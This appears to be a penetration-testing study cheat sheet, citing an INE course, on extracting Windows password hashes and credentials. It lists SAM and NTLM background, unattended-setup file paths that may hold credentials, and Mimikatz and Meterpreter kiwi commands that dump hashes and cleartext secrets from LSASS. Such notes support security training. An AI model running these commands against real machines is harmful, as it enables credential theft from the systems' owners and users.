# Windows Passwords

* [Hashes](#hashes)
* [Windows Configuration Files](#windows-configuration-files)
* [Mimikatz](#mimikatz)
* [Metasploit / Meterpreter](#metasploit--meterpreter)
* [References](#references)

***********************************************************************
Items inside [SQUARE-BRACKETS] indicate changeable (fill in the blank) fields.  
Note: Bracket characters themselves [ ] require removal. See examples.
***********************************************************************

## Hashes

* Stored in Security Accounts Manager (SAM) database.
* Authentication and verification is facilitated by the Local Security Authority (LSA).
   * Elevated/Administrative Privileges are required to interact with LSASS process.

* Two types of hashes:
   * LM (LanMan)
      * LM is disabled from Windows Vista onwards.
   * NTLM (NTHash)
      * Modern Windows use NTLM.
      * No password salts
      * Uses MD4 Algorithm

**************************************

## Windows Configuration Files

### Unattended Windows Setup

* C:\Windows\Panther\Unattend.xml
* C:\Windows\Panther\Autounattend.xml
* Config files may be base64 encoded

**************************************

## Mimikatz

* Requires admin privileges to run correctly.

```
mimikatz.exe
```

Check Privileges (Need: Privilege '20' OK):
```
privilege::debug
```

Dump SAM database / hashes for all users:
```
lsadump::sam
```

Possibly dump clear text creds:
```
lsadump::secrets
```
```
sekurlsa::logonpasswords
```


## Metasploit / Meterpreter

```
migrate [LSASS-PID]
```
```
load kiwi
```
Help menu:
```
?
```
Retrieve all credentials (parsed):
```
creds_all
```
Dump hashes for all users:
```
lsa_dump_sam
```
Possibly dump clear text creds:
```
lsa_dump_secrets
```

**************************************

### References
Penetration Tester Student v2 by INE  
https://my.ine.com/CyberSecurity/learning-paths/61f88d91-79ff-4d8f-af68-873883dbbd8c/penetration-testing-student-v2
